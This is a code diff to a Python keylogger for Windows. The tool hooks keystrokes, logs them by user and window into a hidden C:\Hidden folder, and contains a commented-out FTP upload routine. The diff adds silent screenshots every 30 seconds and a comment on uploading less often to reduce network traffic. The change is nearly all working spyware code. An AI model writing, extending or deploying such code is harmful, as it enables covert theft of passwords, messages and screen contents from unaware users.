@@ -1,18 +1,29 @@
-import pyHook, pythoncom, os, getpass
+import pyHook, pythoncom, os, getpass, time
+from PIL import ImageGrab
 from ftplib import FTP  # for uploading the file to an FTP server
 from datetime import datetime
 
+"""Setting Variables"""
 currentuser = getpass.getuser()  # Get the username of the currently logged in user
-
-newpath = r'C:\Hidden'
-if not os.path.exists(newpath):
-    os.makedirs(newpath)
-
-todays_date = datetime.now().strftime('%Y-%b-%d')
-file_name = 'C:\\Hidden\\' + currentuser + '_' + todays_date + '.txt'
-
 currentline = ""  # This is used to store a buffer of keypresses
 windowname = ""  # Used to store the name of the window being typed in
+todays_date = datetime.now().strftime('%Y-%b-%d')
+file_name = 'C:\\Hidden\\' + currentuser + '_' + todays_date + '.txt'
+starttime = time.time()
+
+"""Creating Filepaths"""
+logpath = r'C:\Hidden'
+if not os.path.exists(logpath):
+    os.makedirs(logpath)
+screenshotpath = (r'C:\Hidden\Screenshots\\' + currentuser)
+if not os.path.exists(screenshotpath):
+    os.makedirs(screenshotpath)
+
+
+def TakeScreenshot():
+    global currentuser
+    image = ImageGrab.grab()  # Copy the currently viewed screen into the image variable
+    image.save('C:\\Hidden\Screenshots\\' + currentuser + '\\' + datetime.now().strftime('%Y%m%d_%H%M%S') + '.png' )
 
 
 def uploadftp():
@@ -27,11 +38,18 @@ def saveline(line):
     newfile = open(file_name, 'a+')
     newfile.write(line)
     newfile.close()
-    """ Uncomment the below to include the FTP upload function, FTP server details should be added above """
-    #uploadftp()
+    # uploadftp()
+    """ Uncomment to include the FTP upload function.  Adding it here would replace the file on the FTP server
+    everytime a new line is created. This could be called elsewhere in the code to lower the frequency and reduce
+    network traffic"""
+
 
 def OnKeyboardEvent(event):
-    global currentline, windowname
+    global currentline, windowname, starttime
+
+    if time.time() - starttime > 30:  # Takes a screenshot every 30 seconds
+        TakeScreenshot()
+        starttime = time.time()  # Reset the counter to 0
 
     if windowname != event.WindowName:  # Check if typing in a new window
         if currentline != "":  # Check to make sure nothing is in the buffer waiting to be added to the log
